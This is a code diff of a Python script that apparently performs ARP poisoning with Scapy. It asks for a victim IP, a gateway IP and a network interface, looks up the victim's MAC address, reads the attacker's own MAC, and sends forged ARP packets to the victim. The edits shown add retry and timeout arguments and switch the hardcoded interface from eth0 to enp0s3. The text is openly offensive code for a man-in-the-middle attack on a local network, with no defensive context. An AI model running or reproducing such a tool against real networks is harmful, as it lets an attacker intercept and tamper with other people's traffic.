@@ -25,7 +25,7 @@ vIP = raw_input("What is the victim IP address?")
 gatewayIP = raw_input("What is the gateway IP address?")
 NetworkI = raw_input("What is your network interface?")
 
-def ip_to_mac(IP):
+def ip_to_mac(IP, retry = 2, timeout = 2):
 
     #create the arp packet that will retrieve the mac address
     arp = ARP()
@@ -33,7 +33,7 @@ def ip_to_mac(IP):
     arp.pdst = IP
     arp.op = 1
 
-    MacResponse, Unanswered = sr(arp, 2, 2)
+    MacResponse, unanswered = sr(arp, retry=retry, timeout=timeout)
 
     for s,r in MacResponse:
     # return the mac address if the arp packet did get a response
@@ -45,8 +45,8 @@ def ip_to_mac(IP):
 # get the mac address of the victim
 vMAC = ip_to_mac(vIP);
 
-#macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)
-macAttacker = subprocess.check_output("cat /sys/class/net/eth0/address", shell = True)
+macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)
+#macAttacker = subprocess.check_output("cat /sys/class/net/eth0/address", shell = True)
 #macAttacker = subprocess.check_output("cat /sys/class/net/" + NetworkI +"/address", shell = True)
 
 #Create arp packet for victim
@@ -59,8 +59,8 @@ arpVictim[ARP].pdst = vIP
 
 #Start arpPoison
 def arpPoison():
-    #sendp(arpVictim, iface="enp0s3")
-    sendp(arpVictim, iface="eth0")
+    sendp(arpVictim, iface="enp0s3")
+    #sendp(arpVictim, iface="eth0")
     #sendp(arpVictim, iface=NetworkI)
     time.sleep(1)
 
